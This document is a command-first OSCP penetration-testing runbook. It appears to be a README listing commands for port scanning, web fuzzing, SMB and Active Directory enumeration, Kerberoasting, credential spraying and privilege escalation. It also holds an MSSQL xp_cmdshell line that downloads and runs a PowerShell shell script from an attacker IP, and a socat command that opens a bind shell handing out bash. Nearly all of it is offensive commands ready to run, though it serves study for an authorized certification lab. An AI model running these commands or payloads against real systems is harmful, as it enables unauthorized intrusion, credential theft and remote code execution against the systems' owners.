# OSCP Runbooks (Command-first)

## Quick usage
Set `KALI_IP=10.10.14.16` before running snippets that need your IP.

## Full TCP scan
nmap -Pn -p- -T4 --min-rate=1000 TARGET

## Top-ports + scripts
nmap -Pn -sC -sV -p22,80,443,139,445,3389,5985,5986 -T4 TARGET

## Web discovery
ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/big.txt -t 50 -mc 200,301,302,401,403 -fs 0 -k
gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 50 -x php,html,txt -k
feroxbuster -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,txt,html -k

## SMB / Windows quick
smbclient -L //TARGET -N
smbmap -H TARGET
crackmapexec smb TARGET -u users.txt -p passwords.txt
impacket-smbclient DOMAIN/USER:PASS@TARGET
impacket-psexec DOMAIN/USER:PASS@TARGET
impacket-wmiexec DOMAIN/USER:PASS@TARGET

## AD / Kerberos
impacket-GetUserSPNs -request -dc-ip DC_IP DOMAIN/USER:PASS
GetNPUsers.py -dc-ip DC -usersfile users.txt -formathashes DOMAIN/ -outputfile asrephashes.txt
certipy-ad find -u USER@DOMAIN -p 'Password' -dc-ip DC_IP -stdout

## MSSQL quick
impacket-mssqlclient DOMAIN/USER:PASS@TARGET
sqlcmd -S TARGET -U user -P pass -Q "EXEC xp_cmdshell 'powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.16/shell.ps1\\\")\"'"

## PrivEsc snippets
# Linux
sudo -l
find / -perm -4000 -type f 2>/dev/null
ps aux | egrep "python|perl|ruby|bash|sh"
# Windows
whoami /all
schtasks /query /fo LIST /v
Get-LocalGroupMember -Group "Administrators"

## Post-exploit
linpeas.sh
winPEAS.bat
mimikatz
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

## Files added
- `OSCP_ENUM_RUNBOOK.sh` (automation runbook script)
- `OSCP_REPORT_TEMPLATE.md` (report template)

